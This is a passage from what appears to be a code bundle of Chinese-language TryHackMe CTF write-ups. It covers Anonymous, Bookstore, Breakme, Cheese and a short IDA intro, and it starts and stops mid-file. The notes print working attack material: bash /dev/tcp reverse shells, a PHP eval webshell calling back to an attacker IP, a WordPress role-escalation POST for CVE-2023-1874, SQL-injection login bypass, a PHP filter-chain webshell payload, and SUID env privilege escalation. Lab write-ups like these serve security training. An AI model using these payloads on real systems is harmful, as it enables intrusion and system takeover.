139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\\x00
|   Domain name: \\x00
|   FQDN: anonymous
|_  System time: 2024-11-20T14:30:58+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-11-20T14:30:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
\`\`\`

### 扫描总结：

1. **目标主机**：
   - IP 地址：\`10.10.226.88\`
   - 主机状态：在线，延迟 0.27s
   - 操作系统：Linux，使用 Samba 服务模拟 Windows 信息（版本 Samba 4.7.6）

---

2. **端口信息**：
   - **21/tcp (FTP)**：
     - 服务：vsftpd 3.0.3
     - 特性：
       - 支持匿名登录（Anonymous FTP）
       - 存在一个可写目录：\`/scripts\`
       - 没有会话带宽限制
     - 安全性：匿名登录与可写目录可能存在敏感信息或恶意文件上传的风险。

   - **22/tcp (SSH)**：
     - 服务：OpenSSH 7.6p1 (Ubuntu)
     - 支持协议：SSH 2.0
     - Hostkey 类型：RSA、ECDSA、ED25519
     - 安全性：未显示明显漏洞，但可尝试弱口令或暴力破解测试。

   - **139/tcp 和 445/tcp (SMB)**：
     - 服务：Samba 文件共享服务
     - 版本：Samba 4.7.6-Ubuntu
     - 特性：
       - NetBIOS 名称：\`ANONYMOUS\`
       - 工作组：\`WORKGROUP\`
       - 认证模式：用户级别认证，但消息签名被禁用（不安全）
       - 系统时间：\`2024-11-20T14:30:58\`

---

3. **潜在风险**：
   - FTP 匿名登录和可写目录可能被用于上传恶意文件。
   - SMB 消息签名被禁用，可能受到中间人攻击。
   - 可以进一步枚举 SMB 服务，查看是否存在敏感共享目录。
   - 端口 22 可以尝试基于暴力破解或默认凭据的测试。

---

**下一步建议**：
1. **针对 FTP**：
   - 登录匿名 FTP，检查可用文件或上传测试文件验证是否支持写入。
   - 检查 \`/scripts\` 目录下是否存在敏感文件。

2. **针对 SMB**：
   - 使用 \`smbclient\` 或其他工具进一步枚举共享资源。
   - 确认是否有未授权访问的目录或敏感数据。

3. **针对 SSH**：
   - 尝试弱口令暴力破解或利用已知漏洞进行测试。

4. **综合测试**：
   - 针对 SMB 和 FTP 的未授权访问，重点检查是否泄露敏感信息或配置文件。

\`\`\`
┌──(leo㉿HACK)-[~]
└─$ cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
\`\`\`

思路：
上传恶意的clean.sh 替换这个 导致反弹shell

### 路径枚举


## 漏洞发现

## 漏洞利用

## webshell

## usershell


![](../assets/img/Pasted%20image%2020241120230510.png)
## rootshell

env具有suid 权限可以进行提权

\`\`\`
/usr/bin/env /bin/sh -p
\`\`\`

## 知识点回顾


### 使用 \`find\` 查找所有系统 SUID 程序

可以更精确地查看系统中常见的目录中具有 SUID 权限的程序，例如：

\`find /bin /sbin /usr/bin /usr/sbin -type f -perm -4000 2>/dev/null\`

这些目录通常包含系统的可执行文件，通过此命令你可以检查这些目录中是否存在具有 SUID 权限的文件。

###  使用 \`which\` 或 \`whereis\` 确定程序的位置

如果你怀疑某个程序具有 SUID 权限，可以使用 \`which\` 或 \`whereis\` 命令来查找该程序的路径，然后使用 \`ls -l\` 查看其权限：

\`which <program_name>\`

\`which passwd\`

然后查看 \`passwd\` 程序的权限：


\`ls -l $(which passwd)\`

### 示例输出

如果一个文件具有 SUID 权限，你将看到类似以下的输出：


\`-rwsr-xr-x 1 root root 12345 Apr 1 2024 /usr/bin/passwd\`

在这个例子中，\`/usr/bin/passwd\` 是一个 SUID 程序，意味着即使普通用户执行它，它也会以 root 权限运行。

### 总结

通过使用 \`find\` 命令查找具有 SUID 权限的程序，或者直接查看文件的权限，你可以识别出可能带来安全风险的程序。确保定期检查系统中具有 SUID 权限的程序，并限制它们的使用权限，尤其是对于不再需要的 SUID 程序。
## 总结

`,B=`---
title: THM-bookstoreoc
tags:
  - 靶场
  - THM
---
>具有基本 Web 枚举和 REST API 模糊测试的初级框。

# 🚀 靶场概述 
**难度**：  中
**描述**：  具有基本 Web 枚举和 REST API 模糊测试的初级框。
Bookstore 是一台 boot2root CTF 机器，它教初学者渗透测试人员基本的 Web 枚举和 REST API 模糊测试

---

## 📋 基本信息 
| 🚀     | **本地机器信息**    | **目标机器信息**   |
| ------ | ------------- | ------------ |
| **IP** | \`10.17.5.121\` | 10.10.96.141 |
| **OS** | \`Kali\`        |              |

---

## 信息搜集

### 1. 🛠️ 端口扫描
- 使用工具如 \`nmap\` 或 \`masscan\` 进行端口扫描，发现目标机器开放的端口。
    \`\`\`bash
┌──(leo㉿HACK)-[~/SecLab/bookstoreoc]
└─$ nmap -sCV -p22,80,5000 $ip -T4
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-22 23:54 HKT
Nmap scan report for 10.10.96.141
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry
|_/api </p>
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds

    \`\`\`

### 2. 🔎 路径探测
- 扫描网站或系统的开放路径，寻找潜在的漏洞。
   \`\`\`bash
   
    gobuster dir -u http://10.17.5.121 -w /usr/share/wordlists/dirb/common.txt
    dirb http://10.17.5.121
    \`\`\`

### 3. 🧰 服务枚举
- 对服务进行详细的枚举，寻找潜在漏洞。
    - 使用工具如 \`nmap\`、\`nikto\`、\`dirbuster\` 等。

---

## 🧠 渗透思路

### 1. ⚡ 攻击向量
- 根据目标机器暴露的服务和漏洞，选择攻击路径。
    - 如 Web 漏洞、SSH 漏洞等。

### 2. 💥 nday 利用
- 查找未打补丁的漏洞，利用公开的 **nday** 漏洞。
    - 通过 Metasploit 或自定义脚本进行利用。

### 3. 🔍 信息审计
- 审计目标系统，查找敏感信息或配置错误。
    - 通过配置文件、日志文件等进行信息审计。

---

## 🌐 Web 渗透测试

- **Web 漏洞扫描**：使用 Burp Suite、Nikto 等工具进行 Web 应用的扫描。
- **漏洞利用**：利用常见漏洞，如 SQL 注入、XSS 等，进行进一步测试。

---

## 🔐 横向移动与后渗透操作

- **横向移动**：一旦获取基础 shell，搜索网络内其他潜在目标，进行横向渗透。
- **后渗透操作**：
    1. 获取敏感信息（如数据库、用户凭证）。
    2. 持久化访问，通过反向 shell、计划任务等手段保持连接。

---

## 🕵️‍♂️ 漏洞利用

### 漏洞名称：<漏洞名称>
- **描述**：<漏洞描述>
- **利用过程**：
    1. **漏洞分析**：<简要描述漏洞的成因>
    2. **编写利用脚本** 或 **使用现有工具**：<如何利用>
    3. **验证漏洞是否有效**：<验证步骤>
    4. **获取相关权限或信息**：<攻击目标后获取的权限>

---

## 💻 getshell

- **描述**：通过漏洞获取目标机器的 shell（命令行访问）。
- **步骤**：
    1. 使用反向 shell 获取访问权限：
        \`\`\`bash
        nc -lvnp 4444
        bash -i >& /dev/tcp/10.17.5.121/4444 0>&1
        \`\`\`
    2. **验证 shell 是否成功**：
        \`\`\`bash
        whoami
        id
        \`\`\`

---

## 🔨 提权

- **描述**：在目标系统中进行权限提升，获取 root 权限。
- **步骤**：
    1. 查看当前用户和权限：
        \`\`\`bash
        whoami
        id
        \`\`\`
    2. 查找本地提权漏洞或配置错误：
        - 使用 \`linpeas\`、\`GTFOBins\` 查找提权方法。
    3. 提升权限至 root 用户：
        \`\`\`bash
        sudo /bin/bash  # 提升为 root
        \`\`\`

---

## 📚 知识点回顾

- **信息搜集技巧**：
    - 端口扫描与服务枚举技巧。
    - Web 漏洞检测技巧（SQL 注入、XSS 等）。
- **漏洞利用技巧**：
    - 如何使用 Metasploit 或自行编写漏洞利用脚本。
    - 获取反向 shell 与持续访问。
- **Post-Exploitation 技巧**：
    - 获取目标的敏感信息和访问权限。
    - 提升权限，进行横向移动。

---

## 🧳 攻击链与流程图

- 可视化渗透测试的整体攻击过程，确保每一步都清晰。

---

## 📅 总结

- **成功步骤**：简要描述成功的渗透测试步骤和关键点。
- **遇到的困难与挑战**：列出在过程中遇到的难点及解决方案。
- **后续建议**：对靶场的进一步探索或防御建议。
`,W=`---
title: breakme
tags:
  - THM
  - 靶场
description: "Breakme\\rBreak this secure system and get the flags, if you can."
---
## 基本信息

目标IP: 10.10.227.21
本机IP：10.17.5.121

### 端口扫描
rustscan
\`\`\`bash
root@HACK:~# rustscan -a 10.10.227.21
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  \`| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
\`-' \`-'\`-----'\`----'  \`-'  \`----'  \`---' \`-'  \`-'\`-' \`-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.227.21:22
Open 10.10.227.21:80
[~] Starting Script(s)
[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-16 00:33 HKT
Initiating Ping Scan at 00:33
Scanning 10.10.227.21 [4 ports]
Completed Ping Scan at 00:33, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:33
Completed Parallel DNS resolution of 1 host. at 00:33, 5.50s elapsed
DNS resolution of 1 IPs took 5.50s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating SYN Stealth Scan at 00:33
Scanning 10.10.227.21 [2 ports]
Discovered open port 22/tcp on 10.10.227.21
Discovered open port 80/tcp on 10.10.227.21
Completed SYN Stealth Scan at 00:33, 0.28s elapsed (2 total ports)
Nmap scan report for 10.10.227.21
Host is up, received timestamp-reply ttl 60 (0.27s latency).
Scanned at 2024-11-16 00:33:47 HKT for 6s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.16 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
\`\`\`

dirsearch
\`\`\`bash
┌──(kali㉿kali)-[~/Documents/thm]
└─$ dirsearch -u http://10.10.227.21/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Documents/thm/reports/http_10.10.227.21/__24-11-15_11-20-59.txt

Target: http://10.10.227.21/

[11:20:59] Starting: 
[11:21:14] 403 -  277B  - /.ht_wsr.txt                                      
[11:21:14] 403 -  277B  - /.htaccess.bak1                                   
[11:21:14] 403 -  277B  - /.htaccess.sample                                 
[11:21:14] 403 -  277B  - /.htaccess.orig
[11:21:14] 403 -  277B  - /.htaccess.save
[11:21:14] 403 -  277B  - /.htaccess_orig                                   
[11:21:14] 403 -  277B  - /.htaccess_extra
[11:21:14] 403 -  277B  - /.htaccess_sc
[11:21:14] 403 -  277B  - /.htaccessOLD
[11:21:14] 403 -  277B  - /.htaccessBAK
[11:21:14] 403 -  277B  - /.htaccessOLD2                                    
[11:21:14] 403 -  277B  - /.html                                            
[11:21:14] 403 -  277B  - /.htm                                             
[11:21:14] 403 -  277B  - /.htpasswd_test                                   
[11:21:14] 403 -  277B  - /.htpasswds
[11:21:14] 403 -  277B  - /.httr-oauth
[11:21:18] 403 -  277B  - /.php                                             
[11:22:49] 301 -  313B  - /manual  ->  http://10.10.227.21/manual/          
[11:22:49] 200 -  208B  - /manual/index.html                                
[11:23:14] 403 -  277B  - /server-status/                                   
[11:23:14] 403 -  277B  - /server-status
[11:23:46] 200 -    2KB - /wordpress/wp-login.php                            
[11:23:47] 200 -   14KB - /wordpress/
\`\`\`

发现有wordpress?

\`wpscan --url http://10.10.227.21/wordpress\`

用户名枚举
\`wpscan --url http://10.10.227.21/wordpress --enumerate u\`

\`\`\`bash

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.227.21/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

\`\`\`

用户名爆破
\`\`\`bash
┌──(kali㉿kali)-[~/Documents/thm/breakmenu]
└─$ wpscan --url http://10.10.227.21/wordpress -U username.txt -P /usr/share/wordlists/rockyou.txt 
\`\`\`

\`\`\`bash
Trying bob / tigger Time: 00:00:03 <> (24 / 14344392)  0.00%  ETrying bob / password1 Time: 00:00:03 <> (25 / 14344392)  0.00%[SUCCESS] - bob / soccer                                       
Trying bob / soccer Time: 00:00:03 <> (29 / 14344422)  0.00%  ETrying bob / anthony Time: 00:00:03 <> (29 / 14344422)  0.00%  Trying bob / anthony Time: 00:00:03 <> (30 / 14344422)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: bob, Password: soccer

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Nov 15 11:50:38 2024
[+] Requests Done: 201
[+] Cached Requests: 7
[+] Data Sent: 57.482 KB
[+] Data Received: 478.876 KB
[+] Memory used: 298.184 MB
[+] Elapsed time: 00:00:27
                                                               
\`\`\`

![](../assets/img/Pasted%20image%2020241116005157.png)


php

现在查看漏洞情况
\`\`\`

[+] WordPress theme in use: twentytwentyfour
 | Location: http://10.10.227.21/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://10.10.227.21/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | Style URL: http://10.10.227.21/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.227.21/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://10.10.227.21/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2024-10-17T00:01:00.000Z
 | [!] The version is out of date, the latest version is 5.5.16
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.227.21/wordpress/wp-content/plugins/wp-data-access/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <============================================
\`\`\`

版本信息
WordPress version 6.4.3
## Bob到admin

### CVE-2023-1874漏洞
增加字段 wpda_role[]=administrator

\`\`\`
POST /wordpress/wp-admin/profile.php HTTP/1.1

Host: 10.10.227.21

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate, br

Referer: http://10.10.227.21/wordpress/wp-admin/profile.php

Content-Type: application/x-www-form-urlencoded

Content-Length: 328

Origin: http://10.10.227.21

Connection: keep-alive

Cookie: wordpress_acb53ed9bd9ffb9d3641ba5b6474a8cd=bob%7C1731862320%7CjmBQkub8cT9VHTtMl4atHbZISLdhsQ6s7X5Z7OXe9DW%7C6142fcc0d753857ba3d07e771cc893e1e4c6cd51c9a49f165f94273087512582; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_acb53ed9bd9ffb9d3641ba5b6474a8cd=bob%7C1731862320%7CjmBQkub8cT9VHTtMl4atHbZISLdhsQ6s7X5Z7OXe9DW%7C5319955523faa3dbf4b646dcee47744c231d7956c4bf85f5b56e2a14c01be0a5; wp-settings-time-2=1731690049; wp-settings-2=mfold%3Do

Upgrade-Insecure-Requests: 1

Priority: u=0, i



_wpnonce=5c284f6a11&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fprofile.php&from=profile&checkuser_id=2&color-nonce=685716284a&admin_color=fresh&admin_bar_front=1&first_name=bob&last_name=bob&nickname=bob&display_name=bob+bob&email=bob%40localhost.com&url=&description=&pass1=&pass2=&action=update&user_id=2&submit=Update+Profile&wpda_role[]=administrator
\`\`\`
## admin权限
![](../assets/img/Pasted%20image%2020241116010554.png)

找到主题
![](../assets/img/Pasted%20image%2020241116010734.png)
修改某个页面 然后进行反弹webshell?
文件上传？
![](../assets/img/Pasted%20image%2020241116011255.png)

\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/breakmenu]
└─$ cat shell.php
<?php
eval(\\"/bin/bash -c 'bash -i >& /dev/tcp/10.17.5.121/4443 0>&1'\\");
?>

\`\`\``,$=`---
title: re入门
tags:
  - CTF
  - 逆向
  - "#IDA"
categories:
  - CTF
---

IDA Pro是一款逆向工程工具，可以用来分析二进制文件，它可以将二进制文件转换成汇编代码，方便我们进行逆向分析。IDA Pro是一款非常强大的逆向工程工具，但是它的学习曲线也比较陡峭，所以我们需要一些基础的知识来帮助我们学习IDA Pro。
===

IDA 分为IDA 32 ,IDA 64,IDA 64是64位的，IDA 32是32位的，我们一般使用IDA 64来分析64位的二进制文件，使用IDA 32来分析32位的二进制文件。

IDA Pro的界面分为几个部分，分别是：
1. 菜单栏
2. 工具栏
3. 函数列表
4. 反汇编窗口
5. 数据窗口
6. 交叉引用窗口
7. 寄存器窗口
8. 栈窗口
9. 伪代码窗口
10. 导入导出窗口


### 先看IDA View界面

![alt text](../assets/img/image-7.png)



## 如何通过反汇编转成C语言代码

我们可以通过IDA Pro将反汇编代码转换成C语言代码，这样我们就可以更加方便的进行逆向分析。我们可以通过以下步骤来将反汇编代码转换成C语言代码：
1. 打开二进制文件
2. 反汇编二进制文件
3. 选择要转换的函数

![alt text](../assets/img/image-8.png)

**跳转变量**

![alt text](../assets/img/image-9.png)`,G=`---
title: chess-ctf
tags:
  - THM
  - tryhackme
  - 靶场
description: 从php伪协议到getshell
---

## 信息搜集
居多端口
查看80


\`\`\`
dirsearch -u http://10.10.129.0 
\`\`\`

\`\`\`bash
kali@kali ~/Documents/thm/cheese 
❯ whatweb http://10.10.129.0/                                                                                                   
http://10.10.129.0/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[info@thecheeseshop.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.129.0], Script, Title[The Cheese Shop]
\`\`\`


SQLmap


\`\`\`
POST /login.php HTTP/1.1
Host: 10.10.129.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.10.129.0
Connection: keep-alive
Referer: http://10.10.129.0/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=admin
\`\`\`


\`\`\`
sqlmap -r r.txt --batch
\`\`\`

\`\`\`
[12:47:27] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 98 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3923 FROM (SELECT(SLEEP(5)))rTrs) AND 'YJdf'='YJdf&password=admin
---
[12:47:45] [INFO] the back-end DBMS is MySQL

\`\`\`

就是利用sqlmap 进一步 提库 提表 提列名 提数据

一种思路是等待爆破结果
一种思路是绕过登录
这里采取绕过 省时间
\`\`\`
' OR 'x'='x'#;
\`\`\`

\`\`\`
http://10.10.129.0/secret-script.php?file=php://filter/resource=users.html
\`\`\`

文件读取？

![](../assets/img/Pasted%20image%2020241116020216.png)

用户名comte
\`\`\`
comte:x:1000:1000:comte:/home/comte:/bin/bash
\`\`\`

可以利用php伪协议进行getshell

\`\`\`
git clone https://github.com/synacktiv/php_filter_chain_generator
\`\`\`

\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/cheese/php_filter_chain_generator]
└─$ python php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>' 
[+] The following gadget chain will generate the following code : <?php system($_GET["cmd"]);?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF